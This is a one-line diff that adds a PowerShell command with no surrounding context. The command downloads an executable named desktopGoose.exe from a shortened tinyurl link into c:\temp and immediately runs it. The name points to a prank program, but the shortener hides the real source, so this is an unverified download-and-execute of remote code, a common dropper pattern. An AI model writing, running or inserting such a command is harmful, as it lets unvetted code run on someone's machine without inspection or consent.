@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://tinyurl.com/46ke8bxu" -OutFile "c:\temp\desktopGoose.exe";c:\temp\desktopGoose.exe
